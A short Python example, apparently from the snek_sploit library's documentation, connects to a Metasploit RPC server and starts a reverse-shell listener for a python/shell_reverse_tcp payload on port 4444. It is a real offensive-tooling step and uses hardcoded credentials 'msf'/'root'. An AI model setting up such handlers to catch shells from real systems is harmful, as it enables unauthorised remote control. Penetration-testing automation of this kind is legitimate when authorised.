from snek_sploit import MetasploitClient


# Initialize the MSF client
client = MetasploitClient("msf", "root", disable_https_warnings=True)

# Create a new console
console = client.consoles.create()

# Execute a set of commands in the console and wait for the output
commands = [
    "use multi/handler",
    "set PAYLOAD python/shell_reverse_tcp",
    "set LHOST 0.0.0.0",
    "set LPORT 4444",
    "run -z",
]
result = console.execute("\n".join(commands))
print(result)
